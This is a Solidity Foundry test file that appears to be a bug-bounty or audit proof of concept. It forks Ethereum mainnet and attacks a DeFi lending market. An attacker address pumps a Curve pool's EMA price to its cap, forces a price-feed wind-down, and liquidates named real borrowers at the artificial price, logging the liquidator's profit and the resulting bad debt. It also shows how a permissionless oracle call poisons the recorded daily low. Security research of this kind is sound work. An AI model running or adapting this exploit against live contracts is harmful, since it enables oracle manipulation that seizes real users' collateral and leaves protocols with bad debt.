// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20, ICurvePoolNG, IWindDownFeed, IFeed, IMarket, IOracle, IEscrow} from "../src/Interfaces.sol";

/// L-1 arm 2: the liquidation cascade after a forced wind-down trigger,
/// plus stopWindDown semantics and pessimistic-oracle low poisoning.
/// Uses REAL open positions read from the fork block.
///
/// NOTE on market 1 (reUSD-sDOLA, StakeDAO strategy escrows): executing
/// escrow.pay() on a local fork reverts inside StakeDAO's CurveStrategy
/// ("NotActivated") -- a local-fork execution artifact in that third-party
/// leg. Proof it is an artifact: `cast call` (eth_call) of the identical
/// withdraw at the identical block succeeds, and mainnet Withdraw events
/// for this market are recent. The Yearn-escrow market (yv-reUSD-sDOLA,
/// same feed, same Market code) executes cleanly and carries the executed
/// proof; market-1 economics are computed from live oracle state with the
/// Market's own formulas and labelled as computed.
contract L1CascadeTest is Test {
    uint256 constant FORK_BLOCK = 26436361;

    address constant EMA_POOL = 0xc522A6606BBA746d7960404F22a3DB936B6F4F50;
    address constant REUSD = 0x57aB1E0003F623289CD798B1824Be09a793e4Bec;
    address constant SDOLA = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
    address constant FEED = 0xF2687C32c03c1B4a52015a029C58f99DC851eFC0;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant LP = 0x48d670D189B4b48757992D36897bCa6E3f889040;
    address constant YVLP = 0x7c439Df9ADE8831180EA4D546c1E910D4Ba71a86;
    address constant MKT = 0xf9287c29Cb888F4834B7D2757a833D509e7f9D9A;
    address constant YVMKT = 0x1fD4985cdd57bDb1eD646B10B7952fCD58946916;
    address constant ORACLE = 0xaBe146CF570FD27ddD985895ce9B138a7110cce8;
    address constant RWG = 0xE3eD95e130ad9E15643f5A5f232a3daE980784cd;

    // Real borrowers at the fork block (debts read on-chain, see report).
    address constant P2 = 0x005ea0be32125792CBff9c6DbaF91a7001e43235; // mkt1: debt 264,112 (95.4% of limit)
    address constant P5 = 0xA05e21550eB86462388783047dA318D2de20BBda; // yv:   debt 275,359 (95.7% of limit)
    address constant P4 = 0xAAc0aa431c237C2C0B5f041c8e59B3f1a43aC78F; // yv:   debt 519,084 (LTV ~77%)

    address attacker = address(0xA77AC6);
    address keeper = address(0xB0B);
    address liquidator = address(0x119);

    ICurvePoolNG pool = ICurvePoolNG(EMA_POOL);
    IWindDownFeed feed = IWindDownFeed(FEED);
    IMarket mkt = IMarket(MKT);
    IMarket yvmkt = IMarket(YVMKT);
    IOracle oracle = IOracle(ORACLE);

    uint256 pTrueLP;
    uint256 pTrueYv;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        deal(DOLA, liquidator, 3_000_000 ether);
        vm.startPrank(liquidator);
        IERC20(DOLA).approve(MKT, type(uint256).max);
        IERC20(DOLA).approve(YVMKT, type(uint256).max);
        vm.stopPrank();
        pTrueLP = oracle.viewPrice(LP, 0);
        pTrueYv = oracle.viewPrice(YVLP, 0);
        console.log("baseline LP oracle price:", pTrueLP);
        console.log("baseline yvLP oracle price:", pTrueYv);
    }

    function _pushToCap() internal {
        deal(REUSD, attacker, 40_000_000 ether);
        vm.startPrank(attacker);
        IERC20(REUSD).approve(EMA_POOL, type(uint256).max);
        uint256 chunk = 100_000 ether;
        for (uint256 i = 0; i < 400; i++) {
            if (pool.last_price(0) >= 1.999e18) break;
            pool.exchange(0, 1, chunk, 0);
        }
        vm.stopPrank();
        require(pool.last_price(0) >= 1.999e18, "cap not reached");
    }

    function _warpToTrigger() internal returns (uint256 elapsed) {
        uint256 t0 = block.timestamp;
        while (!feed.canStartWindDown() && block.timestamp - t0 < 3 hours) {
            vm.warp(block.timestamp + 60);
            vm.roll(block.number + 5);
        }
        require(feed.canStartWindDown(), "not triggerable");
        elapsed = block.timestamp - t0;
    }

    function _logPosition(IMarket m, address user, string memory tag) internal view {
        console.log(tag);
        console.log("  debt:", m.debts(user));
        console.log("  creditLimit (view):", m.getCreditLimit(user));
        console.log("  escrow balance:", IEscrow(m.predictEscrow(user)).balance());
        console.log("  liquidatable now?", m.getCreditLimit(user) < m.debts(user));
    }

    /// Max feasible liquidation, EXECUTED. Returns economics.
    function _maxLiquidate(IMarket m, address user, uint256 truePrice)
        internal
        returns (uint256 repaid, uint256 seized, uint256 seizedTrueValue, uint256 residualDebt)
    {
        uint256 debt = m.debts(user);
        address escrow = m.predictEscrow(user);
        uint256 escBal = IEscrow(escrow).balance();
        uint256 price = oracle.viewPrice(m.collateral(), m.collateralFactorBps());
        uint256 inc = m.liquidationIncentiveBps();
        uint256 maxRepay = escBal * price / 1e18 * 10000 / (10000 + inc);
        if (maxRepay > debt) maxRepay = debt;
        maxRepay = maxRepay * 999 / 1000;
        require(maxRepay > 0, "nothing repayable");
        address col = m.collateral();
        uint256 liqBefore = IERC20(col).balanceOf(liquidator);
        vm.prank(liquidator);
        m.liquidate(user, maxRepay);
        seized = IERC20(col).balanceOf(liquidator) - liqBefore;
        repaid = maxRepay;
        seizedTrueValue = seized * truePrice / 1e18;
        residualDebt = m.debts(user);
    }

    /// Same economics, COMPUTED from live oracle state with the Market's own
    /// formulas (used for market 1, whose third-party escrow leg cannot
    /// execute on a local fork -- see header note).
    function _computeLiquidation(IMarket m, address user, uint256 truePrice)
        internal
        view
        returns (uint256 repaid, uint256 seized, uint256 seizedTrueValue, uint256 residualDebt)
    {
        uint256 debt = m.debts(user);
        uint256 escBal = IEscrow(m.predictEscrow(user)).balance();
        uint256 price = oracle.viewPrice(m.collateral(), m.collateralFactorBps());
        uint256 inc = m.liquidationIncentiveBps();
        repaid = escBal * price / 1e18 * 10000 / (10000 + inc);
        if (repaid > debt) repaid = debt;
        seized = repaid * 1e18 / price;
        seized += seized * inc / 10000;
        if (seized > escBal) seized = escBal;
        seizedTrueValue = seized * truePrice / 1e18;
        residualDebt = debt - repaid;
    }

    function test_Cascade() public {
        _logPosition(mkt, P2, "P2 baseline (market reUSD-sDOLA):");
        _logPosition(yvmkt, P5, "P5 baseline (market yv-reUSD-sDOLA):");
        _logPosition(yvmkt, P4, "P4 baseline (market yv-reUSD-sDOLA):");
        assertGe(mkt.getCreditLimit(P2), mkt.debts(P2), "P2 healthy at baseline");
        assertGe(yvmkt.getCreditLimit(P5), yvmkt.debts(P5), "P5 healthy at baseline");
        assertGe(yvmkt.getCreditLimit(P4), yvmkt.debts(P4), "P4 healthy at baseline");

        _pushToCap();
        vm.warp(block.timestamp + 600);
        vm.roll(block.number + 50);
        console.log("EMA at +600s into climb:", pool.price_oracle(0));
        console.log("LP feed price at +600s:", _lpFeedPrice());
        _logPosition(mkt, P2, "P2 at +600s into the climb (wind-down NOT yet active):");
        _logPosition(yvmkt, P4, "P4 at +600s into the climb:");

        uint256 climb = _warpToTrigger();
        console.log("climb time to trigger (s):", climb);
        vm.prank(keeper);
        feed.startWindDown();
        uint256 tAct = block.timestamp;
        console.log("wind-down activated. startPrice:", feed.windDownStartPrice());
        console.log("LP feed price at activation:", _lpFeedPrice());

        // +1h: inside the programme's 1-hour mitigation window. EXECUTE on P5 (yv).
        vm.warp(tAct + 1 hours);
        vm.roll(block.number + 300);
        console.log("LP feed price at activation+1h:", _lpFeedPrice());
        (uint256 repaid5, uint256 seized5, uint256 true5, uint256 resid5) = _maxLiquidate(yvmkt, P5, pTrueYv);
        console.log("== P5 EXECUTED liquidation at +1h ==");
        console.log("repaid:", repaid5);
        console.log("seized yvLP:", seized5);
        console.log("seized value at undisturbed price:", true5);
        console.log("liquidator extraction (true value - repaid):", true5 - repaid5);
        console.log("residual debt (bad debt):", resid5);
        assertGt(true5, repaid5, "liquidator must profit at artificial price");

        // Same moment, market 1 / P2: computed economics (see header note).
        (uint256 repaid2, uint256 seized2, uint256 true2, uint256 resid2) = _computeLiquidation(mkt, P2, pTrueLP);
        console.log("== P2 COMPUTED liquidation at +1h (market 1) ==");
        console.log("repaid:", repaid2);
        console.log("seized LP:", seized2);
        console.log("seized value at undisturbed price:", true2);
        console.log("liquidator extraction:", true2 - repaid2);
        console.log("residual debt (bad debt):", resid2);

        // +13h: P4 (yv), the ~77% LTV position, deep into the decay.
        vm.warp(tAct + 13 hours);
        vm.roll(block.number + 3900);
        console.log("LP feed price at activation+13h:", _lpFeedPrice());
        (uint256 repaid4, uint256 seized4, uint256 true4, uint256 resid4) = _maxLiquidate(yvmkt, P4, pTrueYv);
        console.log("== P4 EXECUTED liquidation at +13h ==");
        console.log("repaid:", repaid4);
        console.log("seized yvLP:", seized4);
        console.log("seized value at undisturbed price:", true4);
        console.log("liquidator extraction:", true4 - repaid4);
        console.log("residual debt (bad debt):", resid4);

        console.log("== totals (executed, yv market) ==");
        console.log("extraction:", (true5 - repaid5) + (true4 - repaid4));
        console.log("bad debt:", resid5 + resid4);
    }

    function test_StopSemantics_And_LowPoisoning() public {
        _pushToCap();
        _warpToTrigger();
        vm.prank(keeper);
        feed.startWindDown();
        uint256 tAct = block.timestamp;

        // 1h of decay. Any price-consuming market op records the day's low;
        // call the Oracle's state-changing getPrice directly (permissionless)
        // to record exactly what liquidations/withdrawals would record.
        vm.warp(tAct + 1 hours);
        vm.roll(block.number + 300);
        uint256 recorded = oracle.getPrice(LP, 8500);
        console.log("oracle.getPrice during decay (records the low):", recorded);
        uint256 day = block.timestamp / 1 days;
        console.log("poisoned dailyLow recorded today:", oracle.dailyLows(LP, day));
        console.log("undisturbed LP price for reference:", pTrueLP);

        // RWG stops the wind-down (its designed recovery role).
        vm.prank(RWG);
        feed.stopWindDown();
        (, int256 priceAfterStop,, uint256 updAfterStop,) = feed.latestRoundData();
        console.log("feed price right after stop:", uint256(priceAfterStop));
        console.log("feed updatedAt right after stop (0 = borrow still blocked):", updAfterStop);
        console.log("EMA still >= 1.9?", pool.price_oracle(0) >= 1.9e18);

        // Attacker unwinds the pool dislocation; the EMA decays back to ~1.005.
        uint256 sdolaBal = IERC20(SDOLA).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(SDOLA).approve(EMA_POOL, type(uint256).max);
        pool.exchange(1, 0, sdolaBal, 0);
        vm.stopPrank();
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 300);
        (, int256 priceRecovered,,,) = feed.latestRoundData();
        console.log("feed live price after pool recovery:", uint256(priceRecovered));
        console.log("EMA after recovery:", pool.price_oracle(0));

        // Feed healthy again -- but the Oracle's recorded low still binds.
        uint256 dampened = oracle.getPrice(LP, 8500);
        console.log("oracle.getPrice after recovery (same day):", dampened);
        assertLt(dampened, pTrueLP, "borrow power must still be priced off the poisoned low");

        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 7200);
        uint256 dampenedD1 = oracle.getPrice(LP, 8500);
        console.log("oracle.getPrice next day:", dampenedD1);
        assertLt(dampenedD1, pTrueLP, "next day still dampened by yesterday's poisoned low");

        vm.warp(block.timestamp + 1 days);
        vm.roll(block.number + 7200);
        uint256 cleanD2 = oracle.getPrice(LP, 8500);
        console.log("oracle.getPrice two days later:", cleanD2);
        assertGt(cleanD2, dampenedD1, "price recovers only after poisoned days roll off");
    }

    function _lpFeedPrice() internal view returns (int256) {
        (address lpFeed,) = oracle.feeds(LP);
        (, int256 p,,,) = IFeed(lpFeed).latestRoundData();
        return p;
    }
}
